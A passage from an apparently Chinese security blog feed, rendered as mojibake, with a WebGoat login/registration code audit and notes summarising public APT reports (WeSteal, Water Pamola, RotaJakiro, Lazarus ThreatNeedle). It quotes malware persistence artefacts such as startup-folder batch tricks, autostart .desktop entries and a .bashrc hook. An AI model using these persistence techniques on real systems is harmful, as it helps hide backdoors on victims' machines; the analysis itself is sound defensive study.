class=""><p>è¿™ä¸ªæ¥å£ç»§æ‰¿è‡ª<strong>JpaRepository</strong></p><blockquote><p>Jpaæ˜¯ä¸€ç§å¯ä»¥è®©å¼€å‘è€…åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¸ä½¿ç”¨SQLè¯­å¥çš„ä¸€ç§æ–¹æ³•ï¼Œé€šè¿‡ORMæ¡†æ¶å°†æ•°æ®åº“ä¸­çš„å­—æ®µå’Œæˆ‘ä»¬çš„ç±»çš„å±æ€§è¿›è¡Œä¸€ä¸ªå…³ç³»æ˜ å°„                 â€“ å¤©ä¸‹å¤§æœ¨å¤´</p></blockquote><p>ä½œç”¨å°±æ˜¯æ ¹æ®username æŸ¥è¯¢å¹¶è¿”å›ä¸€ä¸ªWebGoatUserç±»å‹çš„å¯¹è±¡</p><p>WebGoatUserç±»å…¶å®å°±æ˜¯è¿›è¡Œæ•°æ®åº“å’Œç±»çš„æ˜ å°„</p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528162435.png" class=""><p>æ•°æ®åº“ä¸­æœ‰username, password å’Œrole. </p><p>å›åˆ°å…ˆå‰çš„<code>UserService.loadUserByUsername</code>, æ‰“æ–­ç‚¹åwebç™»å½•,å°±å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿”å›äº†æŸ¥è¯¢çš„è´¦æˆ·å¯†ç </p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528163112.png" class=""><p>è°ƒè¯•æ—¶æé†’æ‰§è¡Œçš„æ˜¯è¿™ç§å‘½ä»¤<br><code>select webgoatuse0_.username as username1_6_, webgoatuse0_.password as password2_6_, webgoatuse0_.role as role3_6_ from container.web_goat_user webgoatuse0_ where webgoatuse0_.username=?</code> è¿›è¡Œäº†é¢„å¤„ç†</p><h2 id="æ³¨å†Œ"><a href="#æ³¨å†Œ" class="headerlink" title="æ³¨å†Œ"></a>æ³¨å†Œ</h2><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528231350.png" class=""><p>æ•°æ®åŒ…å‘å¾€è¿™ä¸ªåœ°å€</p><p>æŒ‰<code>Ctrl + Shift + F</code>æˆ–<code>Command + Shift + F</code>å…¨å±€æœç´¢, å°±å¯ä»¥çœ‹åˆ°äº†</p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528231538.png" class=""><p>è¿™ä¸ª@PostMapping, æ˜¯Spring bootçš„ä¸€ä¸ªController, åŠŸèƒ½æ˜¯æœ‰å£°æ˜å¤„ç†è¿™ä¸ªè¯·æ±‚çš„è·¯ç”±. æ›´è¯¦ç»†å¯ä»¥çœ‹<a href="https://howtodoinjava.com/spring5/webmvc/controller-getmapping-postmapping/">Spring @PostMapping Example - @GetMapping Example</a></p><p>ç¬¬ä¸€è¡Œä»£ç </p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528234130.png" class=""><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210528234039.png" class=""><p>å°†è¡¨å•è½¬æˆUserFromç±»å‹çš„, UserFormå¦‚ä¸‹,é™å®šäº†é•¿åº¦.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserForm</span> </span>&#123;<br><br>    <span class="hljs-meta">@NotNull</span><br>    <span class="hljs-meta">@Size(min=6, max=40)</span><br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-meta">@NotNull</span><br>    <span class="hljs-meta">@Size(min=6, max=10)</span><br>    <span class="hljs-keyword">private</span> String password;<br>    <span class="hljs-meta">@NotNull</span><br>    <span class="hljs-meta">@Size(min=6, max=10)</span><br>    <span class="hljs-keyword">private</span> String matchingPassword;<br>    <span class="hljs-meta">@NotNull</span><br>    <span class="hljs-keyword">private</span> String agree;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ¤æ–­äº†ç”¨æˆ·åæ˜¯å¦,å¯†ç å’Œç¡®è®¤å¯†ç æ˜¯å¦ç›¸åŒ. éƒ½æ­£ç¡®å°±ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸.</p><p>ä¸­é—´çš„<code>bindingResult.hasErrors()</code>,å¦‚æœä½¿ç”¨ç›¸åŒçš„ç”¨æˆ·å,ä¼šåœ¨è¿™é‡ŒæŠ¥é”™ç„¶åé€€å‡º.</p><p>ç„¶åæ·»åŠ ç”¨æˆ·</p><img src="/2021/05/25/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B61-%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C/image-20210529000843.png" class=""><p>å…ˆæŸ¥è¯¢æ˜¯å¦å­˜åœ¨,ç„¶åå°†ç”¨æˆ·åå¯†ç ä¿å­˜å…¥åº“. æœ€åå¦‚æœä¸å­˜åœ¨å°±ä¿å­˜åˆ°Trackeråº“ä¸­. </p><p>è¿™é‡Œæˆ‘æ„Ÿè§‰,æŸ¥è¯¢ä¹Ÿåº”è¯¥æŸ¥è¯¢çš„æ˜¯Trackeråº“ä¸­å§. èƒ½èµ°åˆ°è¿™é‡Œè‚¯å®šéƒ½æ˜¯Useråº“ä¸­ç”¨æˆ·åä¸å­˜åœ¨çš„. </p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="http://wjlshare.com/archives/1386">Javaä»£ç å®¡è®¡02: ç™»å½•æ³¨å†Œæ¨¡å—åˆå®¡è®¡(æœªå®Œå¾…ç»­) - æœ¨å¤´çš„å°å±‹</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>APTå­¦ä¹ </title>
    <link href="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/05/APT%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•è‡ªå·±çœ‹è¿‡çš„ä¸€äº›APTæŠ¥å‘Šï¼Œå­¦ä¹ æ”»å‡»æ€è·¯</p><h2 id="å®‰å…¨ç ”ç©¶äººå‘˜å‘å¸ƒé’ˆå¯¹WeStealçš„æŠ€æœ¯åˆ†æ"><a href="#å®‰å…¨ç ”ç©¶äººå‘˜å‘å¸ƒé’ˆå¯¹WeStealçš„æŠ€æœ¯åˆ†æ" class="headerlink" title="å®‰å…¨ç ”ç©¶äººå‘˜å‘å¸ƒé’ˆå¯¹WeStealçš„æŠ€æœ¯åˆ†æ"></a><a href="https://unit42.paloaltonetworks.com/westeal/">å®‰å…¨ç ”ç©¶äººå‘˜å‘å¸ƒé’ˆå¯¹WeStealçš„æŠ€æœ¯åˆ†æ</a></h2><h3 id="æ··æ·†"><a href="#æ··æ·†" class="headerlink" title="æ··æ·†"></a>æ··æ·†</h3><p> The Trojan was specifically written for Python 3.9, as the PyInstaller package included python39.dll as the Python interpreter. The developer also used the open source <strong>PyArmor</strong> source code obfuscator, which encrypts the contents of the Python script and decrypts the contents before sending to the Python interpreter for execution,</p><h3 id="é•¿ä¹…åŒ–"><a href="#é•¿ä¹…åŒ–" class="headerlink" title="é•¿ä¹…åŒ–"></a>é•¿ä¹…åŒ–</h3><p> WeStealå°†è‡ªå·±å¤åˆ¶åˆ°<code>C:\Users\&lt;username&gt;\AppData\Local.exe</code></p><p> ç„¶ååˆ›å»ºä¸€ä¸ªbatchè„šæœ¬æ¥å®ç°è‡ªå¯<code>c:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\appdata.bat</code></p><p> å†…å®¹åŒ…å«<code>start %localappdata%</code></p><p> The command above uses a novel technique to obfuscate the batch file starting the WeSteal executable. The start<br>command attempts to run the environment variable %localappdata%, which on a default Windows system is a path to the<br>folder <code>C:\Users\&lt;username&gt;\AppData\Local</code>. However, in this context, the Local in that environment variable is<br>interpreted as a file rather than a subfolder. The start command will run the WeSteal executable Local.exe (the start<br>command does not require the .exe file extension) in the path <code>C:\Users\&lt;username&gt;\AppData\</code>.</p><h2 id="Water-Pamolaé€šè¿‡æ¶æ„è®¢å•æ”»å‡»ç½‘åº—"><a href="#Water-Pamolaé€šè¿‡æ¶æ„è®¢å•æ”»å‡»ç½‘åº—" class="headerlink" title="Water Pamolaé€šè¿‡æ¶æ„è®¢å•æ”»å‡»ç½‘åº—"></a><a href="https://www.trendmicro.com/en_us/research/21/d/water-pamola-attacked-online-shops-via-malicious-orders.html">Water Pamolaé€šè¿‡æ¶æ„è®¢å•æ”»å‡»ç½‘åº—</a></h2><p>æ”»å‡»é“¾<img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_19-28-55.png" class=""></p><h3 id="XSSè„šæœ¬çš„åŠŸèƒ½"><a href="#XSSè„šæœ¬çš„åŠŸèƒ½" class="headerlink" title="XSSè„šæœ¬çš„åŠŸèƒ½"></a>XSSè„šæœ¬çš„åŠŸèƒ½</h3><h4 id="è·å–é¡µé¢ä¿¡æ¯"><a href="#è·å–é¡µé¢ä¿¡æ¯" class="headerlink" title="è·å–é¡µé¢ä¿¡æ¯"></a>è·å–é¡µé¢ä¿¡æ¯</h4><p>å‘ç‰¹å®šé¡µé¢è¯·æ±‚ä¿¡æ¯å¹¶è½¬å‘å“åº”åŒ…åˆ°Water PamolaæœåŠ¡å™¨ã€‚è¿™æ ·å¯ä»¥è®©æ”»å‡»è€…ç†è§£ç¯å¢ƒå¹¶è®¾è®¡æ”»å‡»è„šæœ¬</p><img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_19-31-12.png" class=""><h4 id="çªƒå–å‡­è¯"><a href="#çªƒå–å‡­è¯" class="headerlink" title="çªƒå–å‡­è¯"></a>çªƒå–å‡­è¯</h4><p>ä¸€ç§æ–¹æ³•æ˜¯ä¼ªé€ ç™»å½•ç•Œé¢ã€‚å¦‚æœè¾“å…¥äº†ç™»å½•ä¿¡æ¯ï¼Œè„šæœ¬ä¼šç”¨base64ç¼–ç å‡­è¯ï¼Œç„¶åå‘é€åˆ°Water PamolaæœåŠ¡å™¨ä¸Š</p><img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_19-40-57.png" class=""><p>å¦ä¸€ç§æ–¹æ³•æ˜¯æ˜¾ç¤ºè®¤è¯æŠ¥é”™ï¼Œç„¶åé‡å®šå‘åˆ°é’“é±¼ç½‘ç«™ï¼Œå†è®©ç”¨æˆ·è¾“å…¥å‡­è¯ã€‚åŸŸåå°±åƒ<code>&#123;victimâ€™s domain&#125;[.]basic-authentication[.]live</code>ï¼Œå’‹ä¸€çœ‹åŸŸåå’Œæ­£å¸¸çš„ä¸€æ ·ï¼Œè¿·æƒ‘ç”¨æˆ·</p><img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_19-44-25.png" class=""><h3 id="webshell-PHP-åé—¨æ³¨å…¥"><a href="#webshell-PHP-åé—¨æ³¨å…¥" class="headerlink" title="webshell / PHP åé—¨æ³¨å…¥"></a>webshell / PHP åé—¨æ³¨å…¥</h3><p>é’ˆå¯¹ç‰¹å®šç½‘ç«™çš„æ¡†æ¶ï¼Œå¦‚åœ¨æ—¥æœ¬å¾ˆç«çš„EC-CUBEæ¡†æ¶ã€‚</p><p>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡è°ƒç”¨æ¡†æ¶çš„APIæ¥ä¸Šä¼ php webshellï¼Œ</p><p><a href="http://achineseboy.com/archives/49">phpå‡ ä¸ªå®ç”¨å°æŠ€å·§ â€“ Chinese boy</a></p><img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_19-54-17.png" class=""><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ç¯¡æ”¹ç½‘é¡µheaderæ¥æ³¨å…¥å¯ä»¥æ‰§è¡Œä»»ä½•phpä»£ç çš„ä»£ç ï¼Œå½“ç„¶ï¼Œä»£ç éƒ½æ˜¯æ··æ·†äº†å¾—ã€‚ä¸€å¼€å§‹ç”¨å¼‚æˆ–æ¥è§£ç ï¼Œç„¶åæŠŠbase64 å­—ç¬¦ä¸²è§£ç å‡ºevalã€‚</p><img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_20-00-53.png" class=""><p>ç¬¬ä¸‰ç§æ–¹æ³•æ˜¯å®‰è£…æ¶æ„æ’ä»¶åˆ°æ¡†æ¶ä¸­ã€‚æ’ä»¶æ˜¯è®¾è®¡æ¥æ”¾ç½®webshellçš„</p><img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_20-06-17.png" class=""><img src="/2021/05/05/APT%E5%AD%A6%E4%B9%A0/Snipaste_2021-05-05_20-09-17.png" class=""><h3 id="ä¼ é€æ¶æ„è½¯ä»¶"><a href="#ä¼ é€æ¶æ„è½¯ä»¶" class="headerlink" title="ä¼ é€æ¶æ„è½¯ä»¶"></a>ä¼ é€æ¶æ„è½¯ä»¶</h3><p>è„šæœ¬ä¼šæç¤ºFlashç‰ˆæœ¬è¿‡ä½ï¼Œç„¶åé‡å®šå‘åˆ°å‡çš„flashå®‰è£…ç«™</p><p>ä¸‹è½½ä¹‹åï¼ŒFlashå®‰è£…å™¨æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯sideloadçš„dllå¯èƒ½æ˜¯è¢«æ‰“è¡¥ä¸çš„ï¼Œç„¶åå†åŠ è½½çœŸæ­£çš„æ¶æ„dllã€‚è¿™æ ·é€šè¿‡ä¸¤ä¸ªæ­£å¸¸å’Œæœ‰adobeç­¾åçš„å¯æ‰§è¡Œæ–‡ä»¶å†åŠ è½½æ¶æ„dll</p><h2 id="åŒå¤´é¾™-RotaJakiro-ï¼Œä¸€ä¸ªè‡³å°‘æ½œä¼äº†3å¹´çš„åé—¨æœ¨é©¬"><a href="#åŒå¤´é¾™-RotaJakiro-ï¼Œä¸€ä¸ªè‡³å°‘æ½œä¼äº†3å¹´çš„åé—¨æœ¨é©¬" class="headerlink" title="åŒå¤´é¾™(RotaJakiro)ï¼Œä¸€ä¸ªè‡³å°‘æ½œä¼äº†3å¹´çš„åé—¨æœ¨é©¬"></a><a href="https://blog.netlab.360.com/stealth_rotajakiro_backdoor_cn/">åŒå¤´é¾™(RotaJakiro)ï¼Œä¸€ä¸ªè‡³å°‘æ½œä¼äº†3å¹´çš„åé—¨æœ¨é©¬</a></h2><p>è¿™ä¸ªè¿‡äºç¡¬æ ¸äº†ï¼Œç›´æ¥é€†ç¨‹åºåˆ†æåŠ å¯†ç®—æ³•ç­‰</p><h3 id="æŒä¹…åŒ–"><a href="#æŒä¹…åŒ–" class="headerlink" title="æŒä¹…åŒ–"></a>æŒä¹…åŒ–</h3><p>rootç”¨æˆ·ï¼Œæ ¹æ®ä¸åŒLinuxç³»ç»Ÿå‘è¡Œç‰ˆæœ¬ï¼Œåˆ›å»ºç›¸åº”çš„è‡ªå¯åŠ¨è„šæœ¬ <code>/etc/init/systemd-agent.conf</code> æˆ–è€… <code>/lib/systemd/system/systemd-agent.service</code></p><p>ç”¨äºä¼ªè£…çš„æ–‡ä»¶åï¼Œä¿©è€…2é€‰1</p><ul><li><code>/bin/systemd/systemd-daemon</code></li><li><code>/usr/lib/systemd/systemd-daemon</code></li></ul><p>érootç”¨æˆ·ï¼Œåˆ›å»ºæ¡Œé¢ç¯å¢ƒçš„è‡ªå¯åŠ¨è„šæœ¬<br><code>$HOME/$.config/autostart/gnomehelper.desktop</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Type</span>=Application<br><span class="hljs-attr">Exec</span>=<span class="hljs-variable">$HOME</span>/.gvfsd/.profile/gvfsd-helper<br></code></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹<code>.bashrc</code>åˆ›å»ºshellç¯å¢ƒçš„è‡ªå¯åŠ¨è„šæœ¬</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> [ -d <span class="hljs-variable">$&#123;HOME&#125;</span> ]; then<br><span class="hljs-variable">$&#123;HOME&#125;</span><span class="hljs-regexp">/.gvfsd/</span>.profile/gvfsd-helper<br>fi<br><br></code></pre></td></tr></table></figure><p>ç”¨äºä¼ªè£…çš„æ–‡ä»¶åï¼Œä¿©è€…åŒæ—¶å­˜åœ¨</p><ul><li><code>$HOME/.dbus/sessions/session-dbus</code></li><li><code>$HOME/.gvfsd/.profile/gvfsd-helper</code></li></ul><h3 id="è¿›ç¨‹å®ˆæŠ¤"><a href="#è¿›ç¨‹å®ˆæŠ¤" class="headerlink" title="è¿›ç¨‹å®ˆæŠ¤"></a>è¿›ç¨‹å®ˆæŠ¤</h3><p>rootè´¦æˆ·ä¸‹ï¼Œæ ¹æ®ä¸åŒç‰ˆæœ¬ï¼Œå‘æœåŠ¡é…ç½®æ–‡ä»¶å†™å…¥<code>Restart=always</code>æˆ–è€…<code>respawn</code>ï¼Œè¿™æ ·æœåŠ¡è¿›ç¨‹è¢«ç»“æŸæ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæ–°è¿›ç¨‹</p><p>érootç”¨æˆ·ï¼Œä¼šç”Ÿæˆä¸¤ä¸ªè¿›ç¨‹ï¼Œå½¼æ­¤è§è¯†ï¼ŒåŒè¿›ç¨‹ä¿æŠ¤ï¼š<br>é€šè¿‡å…±äº«å†…å­˜å®ç°è¿›ç¨‹é—´é€šè®¯ï¼Œå‘Šè¯‰å¯¹æ–¹PIDï¼Œç„¶åé€šè¿‡<code>/proc/[PID]</code>åŠ¨æ€è·å¾—è¿›ç¨‹å­˜æ´»æƒ…å†µï¼Œæ­»äº¡æ—¶é€šè¿‡execvoåˆ›å»ºè¿›ç¨‹ï¼Œå¸®åŠ©å¤æ´»</p><h3 id="å•ä¸€å®ä¾‹"><a href="#å•ä¸€å®ä¾‹" class="headerlink" title="å•ä¸€å®ä¾‹"></a>å•ä¸€å®ä¾‹</h3><p>é€šè¿‡æ–‡ä»¶é”å®ç°å•ä¸€å®ä¾‹</p><h3 id="ç½‘ç»œé€šä¿¡"><a href="#ç½‘ç»œé€šä¿¡" class="headerlink" title="ç½‘ç»œé€šä¿¡"></a>ç½‘ç»œé€šä¿¡</h3><p>å¯ä»¥åˆ†æˆä¸¤ä¸ªæˆªæ–­</p><ul><li>Stage1 åˆå§‹åŒ–æˆªæ–­ï¼šè§£å¯†C2åˆ—è¡¨ï¼Œå»ºç«‹è¿æ¥ï¼Œå‘é€ä¸Šçº¿ä¿¡æ¯ï¼Œæ¥å—å¹¶è§£å¯†C2è¿”å›ä¿¡æ¯</li><li>Stage2 ä¸šåŠ¡æˆªæ–­ï¼ŒéªŒè¯è¿”å›ä¿¡æ¯ï¼Œé€šè¿‡éªŒè¯åˆ™æ‰§è¡Œä¸‹å‘æŒ‡ä»¤</li></ul><h2 id="ä»¥æ‹›è˜ä¿¡æ¯ä¸ºè¯±é¥µå¯¹åˆ¶è¯å…¬å¸å‘èµ·æ”»å‡»"><a href="#ä»¥æ‹›è˜ä¿¡æ¯ä¸ºè¯±é¥µå¯¹åˆ¶è¯å…¬å¸å‘èµ·æ”»å‡»" class="headerlink" title="ä»¥æ‹›è˜ä¿¡æ¯ä¸ºè¯±é¥µå¯¹åˆ¶è¯å…¬å¸å‘èµ·æ”»å‡»"></a><a href="https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/lazarus-recruitment/">ä»¥æ‹›è˜ä¿¡æ¯ä¸ºè¯±é¥µå¯¹åˆ¶è¯å…¬å¸å‘èµ·æ”»å‡»</a></h2><p>Todo</p><h2 id="æŸè´§è¿ç‰©æµå…¬å¸Lazarusåé—¨"><a href="#æŸè´§è¿ç‰©æµå…¬å¸Lazarusåé—¨" class="headerlink" title="æŸè´§è¿ç‰©æµå…¬å¸Lazarusåé—¨"></a><a href="https://mp.weixin.qq.com/s/8MN6s-QPDGgr79rEq5wyeA">æŸè´§è¿ç‰©æµå…¬å¸Lazarusåé—¨</a></h2><p>é€šè¿‡Torç½‘ç»œä¸å…¶C2æœåŠ¡å™¨é€šä¿¡</p><p>åé—¨æ˜¯Vyvevaçš„ä¸»è¦ç»„ä»¶ï¼Œå®ƒè¿æ¥åˆ°C2æœåŠ¡å™¨å¹¶æ‰§è¡Œå¨èƒå‚ä¸è€…å‘å‡ºçš„å‘½ä»¤ï¼Œå…¶ä¸­ä¸€äº›å‘½ä»¤æ˜¯å¼‚æ­¥çš„ï¼Œå¹¶ä¸”åœ¨å®ƒä»¬è‡ªå·±çš„çº¿ç¨‹ä¸­æ‰§è¡Œã€‚<br>å®ƒä»¬ä¸­çš„å¤§å¤šæ•°æ˜¯ç”¨äºæ–‡ä»¶å’Œè¿›ç¨‹æ“ä½œæˆ–ä¿¡æ¯æ”¶é›†çš„æ™®é€šå‘½ä»¤ï¼Œä½†æ˜¯å¯¹äºæ–‡ä»¶æ—¶é—´æˆ³è®°ä¹Ÿå­˜åœ¨ä¸€ç§è¾ƒä¸å¸¸ç”¨çš„å‘½ä»¤ï¼Œå®ƒå¯ä»¥å°†creation/write/access timeå…ƒæ•°æ®ä»â€œdonorâ€æ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œæˆ–ä½¿ç”¨2000-2004å¹´ä¹‹é—´çš„éšæœºæ—¥æœŸã€‚</p><h2 id="Lazarusåˆ©ç”¨ThreatNeedleæ”»å‡»æŸå·¥ä¸š"><a href="#Lazarusåˆ©ç”¨ThreatNeedleæ”»å‡»æŸå·¥ä¸š" class="headerlink" title="Lazarusåˆ©ç”¨ThreatNeedleæ”»å‡»æŸå·¥ä¸š"></a><a href="https://mp.weixin.qq.com/s/b7QdHIVJ8ItkKoTk7eayqg">Lazarusåˆ©ç”¨ThreatNeedleæ”»å‡»æŸå·¥ä¸š</a></h2><h3 id="ThreatNeedleçš„åˆæ¬¡æ„ŸæŸ“"><a href="#ThreatNeedleçš„åˆæ¬¡æ„ŸæŸ“" class="headerlink" title="ThreatNeedleçš„åˆæ¬¡æ„ŸæŸ“"></a>ThreatNeedleçš„åˆæ¬¡æ„ŸæŸ“</h3><p>è§‚å¯Ÿåˆ°ä»–ä»¬å¦‚ä½•é€šè¿‡è®¿é—®å†…éƒ¨è·¯ç”±å™¨æœºå™¨å¹¶å°†å…¶é…ç½®ä¸ºä»£ç†æœåŠ¡å™¨ï¼Œä»è€Œå…è®¸ä»–ä»¬å°†è¢«ç›—æ•°æ®ä»Intranetç½‘ç»œä¼ è¾“åˆ°å…¶è¿œç¨‹æœåŠ¡å™¨ï¼Œä»è€Œå…‹æœäº†ç½‘ç»œåˆ†æ®µçš„é—®é¢˜ã€‚</p><p>æ”»å‡»è€…ä½¿ç”¨å…¬å…±ç”µå­é‚®ä»¶æœåŠ¡æ³¨å†Œäº†å¸æˆ·ï¼Œç¡®ä¿å‘ä»¶äººçš„ç”µå­é‚®ä»¶åœ°å€çœ‹èµ·æ¥ä¸åŒ»ç–—ä¸­å¿ƒçš„çœŸå®ç”µå­é‚®ä»¶åœ°å€ç›¸ä¼¼ã€‚ç½‘ç»œé’“é±¼ç”µå­é‚®ä»¶ä¸­æ˜¾ç¤ºçš„ç­¾ååŒ…æ‹¬å—æ”»å‡»ç»„ç»‡çš„åŒ»ç–—ä¸­å¿ƒå‰¯æ ¡é•¿çš„å®é™…ä¸ªäººæ•°æ®ã€‚æ”»å‡»è€…èƒ½å¤Ÿåœ¨åŒ»ç–—ä¸­å¿ƒçš„å…¬å…±ç½‘ç«™ä¸Šæ‰¾åˆ°æ­¤ä¿¡æ¯ã€‚</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">payloadè·¯å¾„ï¼šï¼…APPDATAï¼…<span class="hljs-symbol">\ </span>Microsoft <span class="hljs-symbol">\ </span>Windows <span class="hljs-symbol">\ </span>lconcaches.db<br>å¿«æ·æ–¹å¼è·¯å¾„ï¼šï¼…APPDATAï¼…<span class="hljs-symbol">\ </span>Microsoft <span class="hljs-symbol">\ </span>Windows <span class="hljs-symbol">\å¼€</span>å§‹èœå•<span class="hljs-symbol">\ </span>Programs <span class="hljs-symbol">\ </span>Startup <span class="hljs-symbol">\ </span>OneDrives.lnk<br></code></pre></td></tr></table></figure><p>payloadå°†ä¸‹ä¸€ä¸ªé˜¶æ®µåŠ è½½ä¸ºå†…å­˜ä¸­è¿è¡Œçš„åé—¨ç¨‹åº-ThreatNeedleåé—¨ç¨‹åº</p><h4 id="ThreatNeedle-installer"><a href="#ThreatNeedle-installer" class="headerlink" title="ThreatNeedle installer"></a>ThreatNeedle installer</h4><p>æ¶æ„è½¯ä»¶è¿˜ä¼šå°†é…ç½®æ•°æ®å¦å­˜ä¸ºåœ¨RC4ä¸­åŠ å¯†çš„æ³¨å†Œè¡¨é¡¹</p><h4 id="ThreatNeedle-loader"><a href="#ThreatNeedle-loader" class="headerlink" title="ThreatNeedle loader"></a>ThreatNeedle loader</h4><p>è¯¥ç»„ä»¶è´Ÿè´£å°†æœ€ç»ˆçš„åé—¨payloadåŠ è½½åˆ°å†…å­˜ä¸­ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼ŒThreatNeedleä½¿ç”¨å¤šç§æŠ€æœ¯æ¥è§£å¯†å…¶payloadï¼š</p><p>ä»æ³¨å†Œè¡¨åŠ è½½payloadã€‚</p><p>è§£å¯†RC4å’Œè§£å‹ç¼©åï¼Œä»è‡ªèº«åŠ è½½payloadã€‚</p><p>è§£å¯†AESå’Œè§£å‹ç¼©åï¼Œä»è‡ªèº«åŠ è½½payloadã€‚</p><p>è§£å‹åä»è‡ªèº«åŠ è½½payloadã€‚</p><p>ä¸€å­—èŠ‚å¼‚æˆ–åï¼Œä»è‡ªèº«åŠ è½½payloadã€‚</p><h3 id="æˆåŠŸæ„ŸæŸ“Threat-Needleåçš„é˜¶æ®µ"><a href="#æˆåŠŸæ„ŸæŸ“Threat-Needleåçš„é˜¶æ®µ" class="headerlink" title="æˆåŠŸæ„ŸæŸ“Threat Needleåçš„é˜¶æ®µ"></a>æˆåŠŸæ„ŸæŸ“Threat Needleåçš„é˜¶æ®µ</h3><p>æ”»å‡»è€…æ‰§è¡Œäº†ä¸€ä¸ªåä¸ºResponderçš„å‡­æ®æ”¶é›†å·¥å…·ï¼Œå¹¶ä½¿ç”¨Windowså‘½ä»¤æ¨ªå‘ç§»åŠ¨ã€‚Lazaruså…‹æœäº†ç½‘ç»œåˆ†æ®µé—®é¢˜ï¼Œé€šè¿‡ç ´åè·¯ç”±å™¨è™šæ‹Ÿæœºï¼Œä»ä¸äº’è”ç½‘æ–­å¼€çš„å®Œå…¨éš”ç¦»çš„ç½‘ç»œåˆ†æ®µä¸­çªƒå–æ•°æ®ã€‚</p><p>æœ€åˆï¼Œæ”»å‡»è€…èƒ½å¤Ÿè®¿é—®å…·æœ‰Internetè®¿é—®æƒé™çš„ç³»ç»Ÿï¼Œå¹¶èŠ±è´¹äº†å¾ˆé•¿æ—¶é—´åœ¨ç½‘ç»œçš„ä¼ä¸šéƒ¨é—¨çš„è®¡ç®—æœºä¹‹é—´åˆ†å‘æ¶æ„è½¯ä»¶ã€‚åœ¨å—æ„ŸæŸ“è®¡ç®—æœºä¸­ï¼Œæœ‰ä¼ä¸šITåŸºç¡€æ¶æ„ç®¡ç†å‘˜ä½¿ç”¨çš„è®¡ç®—æœºã€‚</p><p>ç®¡ç†å‘˜å¯ä»¥åŒæ—¶è¿æ¥åˆ°å…¬å¸ç½‘æ®µå’Œå—é™åˆ¶çš„ç½‘æ®µï¼Œä»¥ç»´æŠ¤ç³»ç»Ÿå¹¶åœ¨ä¸¤ä¸ªåŒºåŸŸä¸­ä¸ºç”¨æˆ·æä¾›æŠ€æœ¯æ”¯æŒã€‚ç»“æœï¼Œé€šè¿‡è·å¾—ç®¡ç†å‘˜å·¥ä½œç«™çš„æ§åˆ¶æƒï¼Œæ”»å‡»è€…èƒ½å¤Ÿè®¿é—®å—é™åˆ¶çš„ç½‘æ®µã€‚</p><p>è·¯ç”±å™¨æ˜¯